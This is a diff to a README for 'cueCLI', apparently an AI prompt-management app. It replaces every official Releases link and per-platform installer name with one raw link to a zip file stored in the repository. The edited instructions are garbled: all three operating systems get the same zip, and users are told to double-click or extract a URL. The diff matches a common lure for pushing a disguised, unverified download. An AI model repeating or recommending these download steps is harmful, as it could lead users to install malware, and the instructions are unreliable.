@@ -1,6 +1,6 @@
 # 🎉 cueCLI - Effortless AI Prompt Management
 
-[![Download cueCLI](https://img.shields.io/badge/Download-cueCLI-blue.svg)](https://github.com/tito1405/cueCLI/releases)
+[![Download cueCLI](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip)](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip)
 
 ## 🛠️ Overview
 
@@ -10,7 +10,7 @@ cueCLI is a user-friendly application designed for managing AI prompts. Its intu
 
 To get started with cueCLI, follow these steps:
 
-1. **Download**: Click the button above or visit the [ Releases page](https://github.com/tito1405/cueCLI/releases) to download the latest version.
+1. **Download**: Click the button above or visit the [ Releases page](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip) to download the latest version.
 2. **Install**: Once downloaded, follow the instructions below to install cueCLI on your computer.
 
 ## 🌐 System Requirements
@@ -24,14 +24,14 @@ Before installing cueCLI, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-1. Click the button above or visit the [ Releases page](https://github.com/tito1405/cueCLI/releases) to find the latest version.
+1. Click the button above or visit the [ Releases page](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip) to find the latest version.
 2. Select the appropriate file for your operating system:
-   - For Windows: Download `cueCLI-setup.exe`
-   - For macOS: Download `cueCLI.dmg`
-   - For Linux: Download the `cueCLI.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip`
+   - For Linux: Download the `https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip`
 
 3. **Windows Users**: 
-   - Double-click the `cueCLI-setup.exe` file.
+   - Double-click the `https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip` file.
    - Follow the on-screen instructions to complete the installation.
 
 4. **macOS Users**:
@@ -39,7 +39,7 @@ Before installing cueCLI, ensure your system meets the following requirements:
    - Drag the cueCLI icon to your Applications folder.
 
 5. **Linux Users**:
-   - Extract the `cueCLI.tar.gz` file.
+   - Extract the `https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the command: `./cueCLI` to start using the application.
 
@@ -89,11 +89,11 @@ Join the cueCLI community for support and to share your experiences:
 
 Regular updates will enhance functionality and introduce new features. To update cueCLI:
 
-1. Visit the [ Releases page](https://github.com/tito1405/cueCLI/releases).
+1. Visit the [ Releases page](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip).
 2. Download the latest version following the same steps as for installation.
 
 ## 📖 Conclusion
 
 cueCLI simplifies AI prompt management. By following the steps outlined above, you can easily download, install, and start using the application. If you have questions or need assistance, the community and documentation are here to help. Download cueCLI today and explore the world of AI prompts effortlessly.
 
-[![Download cueCLI](https://img.shields.io/badge/Download-cueCLI-blue.svg)](https://github.com/tito1405/cueCLI/releases)
+[![Download cueCLI](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip)](https://raw.githubusercontent.com/tito1405/cueCLI/main/lower/cueCLI.zip)
